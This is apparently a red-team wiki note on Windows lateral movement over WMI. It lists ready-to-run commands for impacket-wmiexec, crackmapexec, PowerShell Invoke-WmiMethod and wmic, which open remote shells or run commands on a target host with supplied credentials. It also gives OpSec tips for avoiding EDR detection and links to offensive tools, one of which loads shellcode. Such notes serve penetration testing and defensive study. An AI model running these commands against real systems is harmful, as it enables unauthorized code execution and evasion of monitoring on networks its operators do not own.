---
title: WMI Lateral Movement
---

[[notes/lateral-movement/index]] over [[notes/network/wmi]].

The classic method uses the *Win32_Process* class to execute a command that writes the output to file and download the output via SMB.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-wmiexec -shell-type powershell -k -no-pass srv01.corp.local
    impacket-wmiexec -shell-type powershell -silentcommand -nooutput -k -no-pass srv01.corp.local "$(< ./shell.ps1)"
    ~~~

    **OpSec:**
    When `-silentcommand` is specified the command is not execute with `cmd.exe`.
    When `-nooutput` is specified the output is not written to a file and no SMB connection is made.

=== "[[notes/tools/crackmapexec]]"
    ~~~ bash
    crackmapexec smb srv01.corp.local -u jdoe -p 'passw0rd' --exec-method wmiexec -x 'whoami /all'
    ~~~

    **OpSec:** Many EDRs detecte the use of `-X`.

=== "PowerShell"
    ~~~ powershell
    $c = New-Object System.Management.Automation.PSCredential -ArgumentList ('jdoe', (ConvertTo-SecureString 'passw0rd' -AsPlainText -Force))
    Invoke-WmiMethod -Credential $c -Class Win32_Process -Name Create -ArgumentList 'whoami /all' -ComputerName srv01.corp.local
    ~~~

=== "builtin"
    ~~~ bat
    wmic.exe /node:srv01.corp.local /user:"corp\jdoe" /password:"passw0rd" process call create "whoami /all 1> C:\Windows\Temp\out.txt 2>&1"
    ~~~

> **Note:**
> If moving laterally over WMI while impersonating a token fails with error 5 you probably run into [The Curious Case of CoInitializeSecurity](https://training.zeropointsecurity.co.uk/courses/take/red-team-ops/texts/38136687-the-curious-case-of-coinitializesecurity).
> Try again from a different process.

Untested tools:

- [PerfExec](https://github.com/0xthirteen/PerfExec), DLL execution trough Performance Monitor, see [Performance, Diagnostics, and WMI](http://web.archive.org/web/20230712054613/https://scribe.rip/@specterops/performance-diagnostics-and-wmi-21f3e01790d3)
- [wmiexec](https://github.com/WKL-Sec/wmiexec/), command execution by creating scheduled task over WMI, no SMB interaction
- [wmiexec-pro](https://github.com/XiaoliChan/wmiexec-Pro), command execution with output retrieval and file upload/download, no SMB interaction
- [LiquidSnake](https://github.com/RiccardoAncarani/LiquidSnake), creates a WMI event filter that executes VBScript that loads a .NET assembly that executes your shellcode

References:

- [No Win32_Process Needed - Expanding the WMI Lateral Movement Arsenal](http://web.archive.org/web/20230131002717/https://www.cybereason.com/blog/wmi-lateral-movement-win32)
- [Windows Lateral Movement Part 1 – WMI Event Subscription](http://web.archive.org/web/20220328104120/https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/)
- [Unorthodox lateral movement: Stepping away from standard tradecraft](./unorthodox-lateral-movement.pdf), page 60 ff.
